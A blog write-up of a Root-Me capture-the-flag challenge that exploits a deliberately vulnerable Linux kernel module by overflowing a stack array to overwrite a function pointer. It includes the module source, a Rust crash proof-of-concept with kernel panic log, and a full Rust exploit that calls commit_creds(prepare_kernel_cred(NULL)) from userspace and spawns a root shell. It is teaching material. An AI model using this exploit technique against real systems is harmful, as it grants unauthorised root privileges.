+++
title = "Pwn: Linux Kernel x86 - Basic Buffer Overflow"
date = "2025-01-28T12:00:00+01:00"
author = "yocvito"
authorTwitter = "" #do not include @
cover = ""
tags = ["write-up", "pwn", "linux-kernel", "x86"]
keywords = ["write-up", "pwn", "linux-kernel", "x86"]
description = "A simple linux kernel stack overflow challenge where we override a function pointer"
showFullContent = false
readingTime = false
hideComments = false
+++

# PWN: LinKern x86 - Basic Buffer Overflow

We are tasked with exploiting an LKM that performs int to string conversions.

We have access to the source code of the LKM, simplifying the analysis.

## Source code analysis

### LKM initialization

We first search for the functions tagged with `__init` and `__exit` maccros, which are later passed to the `module_init` and `module_exit` maccros and defines the LKM entry and exit points (called when loading/unloading the kernel module). These are the functions responsible for setting up/cleaning up the LKM interactions with the kernel (set up hooks, char devices, ...)

```C
static int __init tostring_init(void) /* Constructor */
{
  printk(KERN_INFO "Tostring registered");
  tostring.pointer=0;
  tostring.tostring_read= tostring_read_hexa;
  if (alloc_chrdev_region(&first, 0, 1, "tostring") < 0)
  {
    return -1;
  }
  if ((cl = class_create(THIS_MODULE, "chardrv")) == NULL)
  {
    unregister_chrdev_region(first, 1);
    return -1;
  }
  if (device_create(cl, NULL, first, NULL, "tostring") == NULL)
  {
    printk(KERN_INFO "Tostring error");
    class_destroy(cl);
    unregister_chrdev_region(first, 1);
    return -1;
  }
  cdev_init(&c_dev, &pugs_fops);
  if (cdev_add(&c_dev, first, 1) == -1)
  {
    device_destroy(cl, first);
    class_destroy(cl);
    unregister_chrdev_region(first, 1);
    return -1;
  }
 
  printk(KERN_INFO "<Major, Minor>: <%d, %d>\n", MAJOR(first), MINOR(first));
  return 0;
}
 
static void __exit tostring_exit(void) /* Destructor */
{
    unregister_chrdev_region(first, 3);
    printk(KERN_INFO "Tostring unregistered");
}
 
module_init(tostring_init);
module_exit(tostring_exit);
```

As we can see, the init function allocates a character device at `/dev/tostring` (with the `device_create` function). 

<!-- TODO: More explanation on char device creation -->

It initialize it's `file_operations` struct (responsible for defining the API of the character device) to the following content:

```C
static struct file_operations pugs_fops =
{
  .owner = THIS_MODULE,
  .open = tostring_open,
  .release = tostring_close,
  .read = tostring_read,
  .write = tostring_write
};
```

This means that using `open/close/read/write` syscalls on the `/dev/tostring` character device will make the kernel call the fops struct functions. Here is the entry point for the LKM.

Thus we know that if a bug resides in the LKM, it is likely to be triggered by this interface (more complex LKMs would eventually require to interact with other kernel components in order to exploit)

### Char device interface analysis

The `tostring_open` and ` tostring_close` functions are dummy functions that only prints a message (it could initiliaze data structures or stuff related to the LKM logic). Here it is mostly to comply with the "Everything is a file" linux phylosophy, where userspace programs will open/close the file (our character device) before/after interacting with it using read/write.

Both read and write primitives internally uses the following C struct:
```C
struct tostring_s {
  int pointer;
  unsigned long long int tostring_stack[64];
  ssize_t (*tostring_read)(struct file *f, char __user *buf, size_t len, loff_t *off); 
};
```

It holds a memory area to store integers to convert (`tostring_stack`), an integer `pointer` to the internal struct stack memory, and a function pointer to the reading primitive function (`tostring_read`).

_One could notice that storing data related to control flow alongside working data memory is not a good practice._

#### Writing to char device

The `tostring_write` function has a double logic based on the first character of the supplied buffer (argument `buf`). It can either modify the string reading logic of the LKM, or add data to the internal `tostring_s` struct.

It first copy data from userspace to kernel space (this is classical behavior to avoid using the userspace memory pointers directly)

Then it analyze the first character of the input buffer. If the first character is a `M` it analyze the second character. If it's a `H` it set the internal reading primitive to `tostring_read_hexa`, and set it to `tostring_read_dec` if second char is a `D`.

Otherwise, it copies the first bytes (8 bytes on a 64bits machine) of the buffer to the internal `tostring_s` stack memory without any checks on the maximal size of this field. 

**This typically allows an attacker to overwrite data which are located just after the internal stack in memory** _(here the `tostring_read` function pointer)_

```C
static ssize_t tostring_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
 
  char *bufk;
  
  printk(KERN_INFO "Tostring: write()\n");
  // rajout du 0 final
  
  bufk = kmalloc(len + 1, GFP_DMA);

 
  if (bufk){
 
    if (copy_from_user(bufk, buf, len))
        return -EFAULT;
 
    bufk[len] = '\0';
    
    
    if (bufk[0]=='M') {
      if (bufk[1]=='H') tostring.tostring_read= tostring_read_hexa;
      else if (bufk[1]=='D') tostring.tostring_read= tostring_read_dec;
    }
    else {
      printk("tostring: insertion %d\n",*((int *) bufk));
      tostring.tostring_stack[tostring.pointer++]= *((long long int *) bufk);;      
    }
  }
  kfree(bufk);
  return len;
 
}
```

#### Reading from char device

On ther other hand, the reading function just calls the `tostring_read` function stored in the internal `tostring_s` struct, which should fill the input buffer with either a decimal or hexadecimal string representing the top integer value of `tostring_stack` (if not empty).

```C
static ssize_t tostring_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
  printk(KERN_INFO "Tostring: read()\n");
  return(tostring.tostring_read)(f, buf, len, off); 
}

static ssize_t tostring_read_hexa(struct file *f, char __user *buf, size_t len, loff_t *off)
{
  printk(KERN_INFO "Tostring: read_hexa()\n");
  if (tostring.pointer > 0)
    return(snprintf(buf,len,"%16llx\n",tostring.tostring_stack[--tostring.pointer]));
  else return(0);
}

static ssize_t tostring_read_dec(struct file *f, char __user *buf, size_t len, loff_t *off)
{
  printk(KERN_INFO "Tostring: read_dec()\n");
  if (tostring.pointer > 0)
    return(snprintf(buf,len,"%lld\n",tostring.tostring_stack[--tostring.pointer]));
  else return(0);
}
```

If we achieve to overwrite the `tostring_read` function pointer with the address of any other kernel function, we can achieve code execution from the LKM context (likely giving full privileges to the system). 

## Exploitation

### Verify our guess + exploit skeletton

First, we will write a simple script that trigger the bug we found. The script will be adapted later to craft the exploit.

What we need to do is:
1. Open `/dev/tostring`
2. Fill the stack to make it full (by writing 32 bits integers)
3. Write the stack with our malicious pointer (should overflow the stack and overwrite `tostring_read`)
4. Performs a read to call the `tostring_read` function pointer, effectively diverting the control flow to our malicious function 

Here is a simple Rust code doing this:
```Rust
use std::{fs::OpenOptions, io::{Read, Write}};

const TOSTRING_STACK_SIZE: usize = 64;

fn main() {
   
    let intval: usize = 0xdeadbeef;
    let tostring_read_override_ea: usize = 0x41414141;

    let mut dev = match OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tostring")
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to open /dev/tostring: {}", e);
            std::process::exit(1);
        }
    };

    // grow stack
    for _ in 0..TOSTRING_STACK_SIZE {
        dev.write_all(&intval.to_le_bytes()).expect("Failed to write to /dev/tostring to override stack");
    }

    // overwrite `tostring_read`
    dev.write_all(&tostring_read_override_ea.to_le_bytes()).expect("Failed to write to /dev/tostring to override function pointer");

    let mut ret = [0u8; size_of::<usize>()];
    dev.read_exact(&mut ret).expect("Failed to read from /dev/tostring"); // <-- should make kernel crash
    println!("result: {:#x}", usize::from_le_bytes(ret));
}
```

The target runs on a 32bits x86 processor, meaning we have to compile the binary for this target:
```bash
mkdir ch1_exploit && cd ch1_exploit
cargo init .
vi src/main.rs # paste code above and type :x! to exit

# add the x86 static target
rustup target add i686-unknown-linux-musl

# build the binary
cargo build --target i686-unknown-linux-musl
```

Then, uploading the binary to the target and running it gives us the following crash. We sucessfully triggered the bug ! (notice the `IP = 0x41414141` message indicating kernel tried to branch to the address we injected)


```bash
Root-Me user@linkern-chall:~$ ./exploit
[  300.010914] BUG: unable to handle kernel paging request at 41414141
[  300.019794] IP: 0x41414141
[  300.023392] *pde = 00000000
[  300.023394]
[  300.029519] Oops: 0000 [#1] SMP
[  300.032706] Modules linked in: basic1_ch1(O)
[  300.037291] CPU: 0 PID: 1050 Comm: exploit Tainted: G           O    4.10.3 #4
[  300.044501] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  300.054875] task: c2bbabc0 task.stack: c2900000
[  300.061686] EIP: 0x41414141
[  300.066930] EFLAGS: 00010296 CPU: 0
[  300.073703] EAX: c2ac4540 EBX: c2ac4540 ECX: 00000004 EDX: bfa09fe8
[  300.084471] ESI: bfa09fe8 EDI: 00000004 EBP: c2901eec ESP: c2901ed8
[  300.095701]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068
[  300.105140] CR0: 80050033 CR2: 41414141 CR3: 0290a000 CR4: 00000690
[  300.116913] Call Trace:
[  300.121776]  ? tostring_read+0x2d/0x40 [basic1_ch1]
[  300.130786]  ? tostring_open+0x20/0x20 [basic1_ch1]
[  300.140015]  __vfs_read+0x24/0x110
[  300.146076]  ? rw_verify_area+0x5c/0x120
[  300.153662]  vfs_read+0x76/0x140
[  300.159884]  SyS_read+0x39/0x90
[  300.166064]  do_fast_syscall_32+0x85/0x150
[  300.174031]  entry_SYSENTER_32+0x47/0x71
[  300.181482] EIP: 0xb776dcc5
[  300.186867] EFLAGS: 00000292 CPU: 0
[  300.193362] EAX: ffffffda EBX: 00000003 ECX: bfa09fe8 EDX: 00000004
[  300.204696] ESI: 00000000 EDI: 00000000 EBP: 00000000 ESP: bfa09f44
[  300.216088]  DS: 007b ES: 007b FS: 0000 GS: 0033 SS: 007b
[  300.226188] Code:  Bad EIP value.
[  300.232677] EIP: 0x41414141 SS:ESP: 0068:c2901ed8
[  300.241635] CR2: 0000000041414141
[  300.248291] ---[ end trace 90f382dd3902791d ]---
[  300.256918] Kernel panic - not syncing: Fatal exception
[  300.268806] Kernel Offset: disabled
[  300.275348] Rebooting in 1 seconds..
```


### Crafting the exploit

Previously, we saw a bug in the target LKM that would allow an attacker to overwrite a function pointer used by the module, and then trigger a call to this function pointer.

From this we can infer that the target kernel function will be called with the arguments for `tostring_read`. It can be problematic for calling specific functions, but in our case, some security protections (**SMAP** & **SMEP**) are not enabled, meaning we can try to exploit another way (which is simplier).

#### Executing code

Instead of trying to divert control flow to **kernel functions**, or **ROP** into kernel memory, we could just write a userspace function that performs the privilege escalation logic and uses addresses of kernel functions. As SMEP isn't enabled, kernel will **jump to userspace and execute code**.


#### Escalating privilege from kernel

When a userspace program wants to escalate its privilege to root by exploiting the kernel, it can achieve it by changing it's credentials to root (uid=0 and gid=0).

Changing a process credentials inside the kernel is typically done by calling `commit_creds` function with a `struct cred` parameter initialized to zero (representing credentials of user root). 

Getting a pointer to a root credentials structure is as simple as calling `prepare_kernel_cred(NULL)`. This works only on linux kernel versions older than `6.2.0`, because the kernel was defaulting the credentials to the init process credentials (pid 1, likely root) in case no argument was provided to the `prepare_kernel_cred` function. 
You can see the [commit](https://github.com/torvalds/linux/commit/5a17f040fa332e71a45ca9ff02d6979d9176a423) removing this behavior from the linux kernel (new exploits now need to directly write the `task_struct` of current process to modify credentials)

For simplicity, we will stick to the older kernels exploit style: `commit_creds(prepare_kernel_cred(NULL))`

#### Getting kernel functions adresses

The kernel directly exposes the kernel functions adresses in the `/proc/kallsyms` file (even for non root user), meaning we do not need to leak a pointer from kernel space.

```bash
$ cat /proc/kallsyms | grep prepare_kernel_cred
# 0000000000000000 T prepare_kernel_cred
$ cat /proc/kallsyms | grep commit_creds
# 0000000000000000 T commit_creds
```

### Getting root

Piecing all of this together, we modify the previous script to exploit the vulnerability and get a root shell :

```rust
use std::{
    arch::asm,
    fs::OpenOptions,
    io::{Read, Write},
};

const TOSTRING_STACK_SIZE: usize = 64;

const PREPARE_KERNEL_CRED_EA: usize = 0xc10711f0;
const COMMIT_CREDS_EA: usize = 0xc1070e80;

extern "C" fn escalate_privileges() -> isize {
    unsafe {
        asm!(
            "xor eax, eax",
            "call ebx", // syscall abi (takes args from eax, ecx, edx)
            "call edi", // same
            in("ebx") PREPARE_KERNEL_CRED_EA,
            in("edi") COMMIT_CREDS_EA
        )
    };

    0
}

fn main() {
    println!("[-] @prepare_kernel_cred = 0x{:x}", PREPARE_KERNEL_CRED_EA);
    println!("[-] @commit_creds = 0x{:x}", COMMIT_CREDS_EA);
    println!("[?] Check out function addresses in /proc/kallsyms");

    let intval: usize = 0xdeadbeef;
    let tostring_read_override_ea: usize = escalate_privileges as usize;

    let mut dev = match OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tostring")
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to open /dev/tostring: {}", e);
            std::process::exit(1);
        }
    };

    println!("[*] Filling stack");
    for _ in 0..TOSTRING_STACK_SIZE {
        dev.write_all(&intval.to_le_bytes())
            .expect("Failed to write to /dev/tostring to override stack");
    }

    println!("[*] Overriding function pointer");
    dev.write_all(&tostring_read_override_ea.to_le_bytes())
        .expect("Failed to write to /dev/tostring to override function pointer");

    let mut ret = [0u8; size_of::<usize>()];
    println!(
        "[*] Triggering vuln. Should call our injected function pointer (ea=0x{:x})",
        escalate_privileges as usize
    );
    let _ = dev.read_exact(&mut ret);

    if unsafe { libc::getuid() == 0 && libc::getgid() == 0 } {
        println!("[+] Got root ! Spawning shell...");
        let mut child = std::process::Command::new("/bin/sh").spawn().unwrap();

        child.wait().unwrap();
    } else {
        eprintln!("[!] Failed to get root");
    }
}
```

Upload the binary to the shared folder of the QEMU VM, and run it. We got a root shell !
```plaintext
Root-Me user@linkern-chall:~$ ./exploit 
[-] @prepare_kernel_cred = 0xc10711f0
[-] @commit_creds = 0xc1070e80
[?] Check out function addresses in /proc/kallsyms
[*] Filling stack
[*] Overriding function pointer
[*] Triggering vuln. Should call our injected function pointer (ea=0x804b250)
[+] Got root ! Spawning shell...
Root-Me root@linkern-chall:/home/user$ cat /passwd/passwd
__FLAG__
```

